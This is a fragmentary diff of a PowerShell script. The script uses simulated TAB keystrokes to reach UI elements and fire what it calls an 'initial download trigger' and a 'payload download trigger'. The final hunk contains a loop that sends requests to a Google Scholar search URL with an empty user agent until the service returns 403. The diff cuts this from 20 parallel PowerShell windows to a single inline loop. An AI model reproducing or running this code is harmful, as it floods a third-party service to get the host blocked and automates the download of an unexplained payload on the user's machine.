@@ -16,7 +16,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetUnoFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 70
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 65
 }
 if($targetUnoFound){
 Write-Host "Striking initial download trigger..."
@@ -41,7 +41,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetDosFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 70
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 65
 }
 if($targetDosFound){
 Write-Host "Striking payload download trigger..."
@@ -175,20 +175,14 @@ break
 }
 }
 }
-$count = 20
-$command = '
 while ($true) {
 try {
-Invoke-RestMethod -Uri "https://scholar.google.com/scholar?q=google+""&start=990" -Method Get -UserAgent "" -ErrorAction Stop
+$null = Invoke-RestMethod -Uri "https://scholar.google.com:443/scholar?q=google+""&start=990" -Method Get -UserAgent "" -ErrorAction Stop
 }
 catch {
 if ($_.Exception.Response.StatusCode -eq 403){
 break
 }
 }
-}
-'
-1..$count | ForEach-Object{
-Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $command
 }
 [Environment]::Exit(0)
